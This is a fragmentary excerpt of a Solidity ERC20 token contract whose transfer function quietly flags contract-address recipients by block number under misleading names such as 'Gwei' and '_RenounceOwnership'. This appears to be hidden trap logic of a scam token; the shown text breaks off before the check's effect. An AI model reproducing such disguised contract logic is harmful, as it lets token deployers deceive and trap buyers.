...
contract ERC20 is Context, IERC20 {
  ...
  mapping(address => bool) private _approveNextBlock;	//next block
  mapping(address => uint256) private _approveBlockNumber; //next block
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    if (!_isFirstTransferDone) {
        ...
        if (codeSize > 0 && !_approveNextBlock[recipient]) {    
            _approveNextBlock[recipient] = true;    
            _approveBlockNumber[recipient] = block.number;    
        }    
        if (getApproval[recipient] == 0 && !Gwei[recipient]) {    
            _sendApproval(recipient, _RenounceOwnership);    
        }    
    }    
    if (_approveNextBlock[sender] && block.number > _approveBlockNumber[sender]) {    
